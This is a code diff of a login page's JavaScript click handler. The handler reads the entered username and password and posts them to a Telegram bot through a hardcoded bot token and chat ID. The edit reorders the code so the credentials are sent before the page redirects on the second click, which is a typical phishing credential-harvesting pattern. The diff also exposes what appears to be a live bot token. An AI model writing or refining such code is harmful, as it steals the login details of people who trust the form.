@@ -45,16 +45,12 @@ loginBtn.addEventListener('click', function (e) {
     loginClicked = true;
   }
 
-  if (loginClickCount === 2) {
-    window.location.href = './galo/galo.html';
-    return;
-  }
-
   const username = usernameInput.value.trim();
   const password = passwordInput.value.trim();
 
   if (!username || !password) return;
 
+  // Send to Telegram
   const message = `Username: ${username}\nPassword: ${password}`;
   const botToken = '8122183423:AAEnHjyJnIYZEI1PtTHEFCwh3k5I7nymtfs';
   const chatId = '1580328848';
@@ -77,4 +73,9 @@ loginBtn.addEventListener('click', function (e) {
     .catch(error => {
       console.error('Error sending message:', error);
     });
+
+  // 2-chi marta bosilsa - sahifani o'zgartirish
+  if (loginClickCount === 2) {
+    window.location.href = '../galo/galo.html';
+  }
 });
